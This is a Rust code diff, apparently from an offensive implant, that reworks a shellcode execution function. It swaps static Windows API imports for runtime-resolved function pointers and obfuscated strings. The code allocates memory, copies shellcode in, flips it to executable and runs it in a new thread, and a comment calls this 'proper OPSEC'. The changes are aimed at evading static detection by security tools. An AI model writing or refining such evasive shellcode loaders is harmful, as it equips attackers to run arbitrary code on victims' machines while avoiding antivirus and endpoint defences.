@@ -14,17 +14,7 @@ use std::mem;
 #[cfg(target_os = "windows")]
 use winapi::shared::minwindef::DWORD;
 #[cfg(target_os = "windows")]
-use winapi::um::processthreadsapi::{CreateThread, GetExitCodeThread};
-#[cfg(target_os = "windows")]
-use winapi::um::memoryapi::{VirtualAlloc, VirtualFree, VirtualProtect};
-#[cfg(target_os = "windows")]
-use winapi::um::handleapi::CloseHandle;
-#[cfg(target_os = "windows")]
-use winapi::um::synchapi::WaitForSingleObject;
-#[cfg(target_os = "windows")]
 use winapi::um::errhandlingapi::GetLastError;
-#[cfg(target_os = "windows")]
-use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_READWRITE, PAGE_EXECUTE_READ};
 
 // WAIT_TIMEOUT constant
 #[cfg(target_os = "windows")]
@@ -141,7 +131,53 @@ pub fn inject_shellcode(
 unsafe fn execute_shellcode_in_thread(shellcode: &[u8]) -> Result<String, String> {
     let buffer_size = shellcode.len();
 
-    let executable_mem = VirtualAlloc(
+    // Type definitions for dynamically resolved functions
+    type VirtualAllocFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32, u32) -> *mut std::ffi::c_void;
+    type VirtualProtectFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32, *mut u32) -> i32;
+    type VirtualFreeFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32) -> i32;
+    type CreateThreadFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, Option<unsafe extern "system" fn(*mut std::ffi::c_void) -> u32>, *mut std::ffi::c_void, u32, *mut u32) -> *mut std::ffi::c_void;
+    type WaitForSingleObjectFn = unsafe extern "system" fn(*mut std::ffi::c_void, u32) -> u32;
+    type CloseHandleFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+    type GetExitCodeThreadFn = unsafe extern "system" fn(*mut std::ffi::c_void, *mut u32) -> i32;
+
+    // Dynamically resolve APIs at runtime
+    let virtual_alloc: VirtualAllocFn = std::mem::transmute(
+        crate::winapi_resolve::resolve("kernel32.dll", "VirtualAlloc")
+            .ok_or_else(|| format!("{}: resolve failed", crate::obfstr::d(crate::obfstr::S_API_VIRTUAL_ALLOC)))?
+    );
+    let virtual_protect: VirtualProtectFn = std::mem::transmute(
+        crate::winapi_resolve::resolve("kernel32.dll", "VirtualProtect")
+            .ok_or_else(|| format!("{}: resolve failed", crate::obfstr::d(crate::obfstr::S_API_VIRTUAL_PROTECT)))?
+    );
+    let virtual_free: VirtualFreeFn = std::mem::transmute(
+        crate::winapi_resolve::resolve("kernel32.dll", "VirtualFree")
+            .ok_or_else(|| "VirtualFree: resolve failed".to_string())?
+    );
+    let create_thread: CreateThreadFn = std::mem::transmute(
+        crate::winapi_resolve::resolve("kernel32.dll", "CreateThread")
+            .ok_or_else(|| format!("{}: resolve failed", crate::obfstr::d(crate::obfstr::S_API_CREATE_THREAD)))?
+    );
+    let wait_for_single_object: WaitForSingleObjectFn = std::mem::transmute(
+        crate::winapi_resolve::resolve("kernel32.dll", "WaitForSingleObject")
+            .ok_or_else(|| "WaitForSingleObject: resolve failed".to_string())?
+    );
+    let close_handle: CloseHandleFn = std::mem::transmute(
+        crate::winapi_resolve::resolve("kernel32.dll", "CloseHandle")
+            .ok_or_else(|| "CloseHandle: resolve failed".to_string())?
+    );
+    let get_exit_code_thread: GetExitCodeThreadFn = std::mem::transmute(
+        crate::winapi_resolve::resolve("kernel32.dll", "GetExitCodeThread")
+            .ok_or_else(|| "GetExitCodeThread: resolve failed".to_string())?
+    );
+
+    // Use numeric constants instead of named winapi constants
+    const MEM_COMMIT: u32 = 0x1000;
+    const MEM_RESERVE: u32 = 0x2000;
+    const MEM_RELEASE: u32 = 0x8000;
+    const PAGE_READWRITE: u32 = 0x04;
+    const PAGE_EXECUTE_READ: u32 = 0x20;
+
+    let executable_mem = virtual_alloc(
         ptr::null_mut(),
         buffer_size,
         MEM_COMMIT | MEM_RESERVE,
@@ -165,14 +201,14 @@ unsafe fn execute_shellcode_in_thread(shellcode: &[u8]) -> Result<String, String
 
     // Flip RW to RX (no write after copy — proper OPSEC)
     let mut old_protect: u32 = 0;
-    if VirtualProtect(executable_mem, buffer_size, PAGE_EXECUTE_READ, &mut old_protect) == 0 {
-        VirtualFree(executable_mem, 0, MEM_RELEASE);
+    if virtual_protect(executable_mem, buffer_size, PAGE_EXECUTE_READ, &mut old_protect) == 0 {
+        virtual_free(executable_mem, 0, MEM_RELEASE);
         return Err(format!("{}: {}", crate::obfstr::d(crate::obfstr::S_API_VIRTUAL_PROTECT), GetLastError()));
     }
 
     // Create thread to execute shellcode
     let mut thread_id: u32 = 0;
-    let thread_handle = CreateThread(
+    let thread_handle = create_thread(
         ptr::null_mut(),
         0,
         Some(mem::transmute(executable_mem)),
@@ -182,7 +218,7 @@ unsafe fn execute_shellcode_in_thread(shellcode: &[u8]) -> Result<String, String
     );
 
     if thread_handle.is_null() {
-        VirtualFree(executable_mem, 0, MEM_RELEASE);
+        virtual_free(executable_mem, 0, MEM_RELEASE);
         return Err(format!(
             "{}: {}",
             crate::obfstr::d(crate::obfstr::S_API_CREATE_THREAD),
@@ -191,10 +227,10 @@ unsafe fn execute_shellcode_in_thread(shellcode: &[u8]) -> Result<String, String
     }
 
     // Wait for thread with timeout (1 second)
-    let wait_result = WaitForSingleObject(thread_handle, 1000); // 1 second timeout
+    let wait_result = wait_for_single_object(thread_handle, 1000);
     let mut exit_code: u32 = 0;
-    GetExitCodeThread(thread_handle, &mut exit_code);
-    CloseHandle(thread_handle);
+    get_exit_code_thread(thread_handle, &mut exit_code);
+    close_handle(thread_handle);
 
     // Don't free memory - shellcode might still be running
 
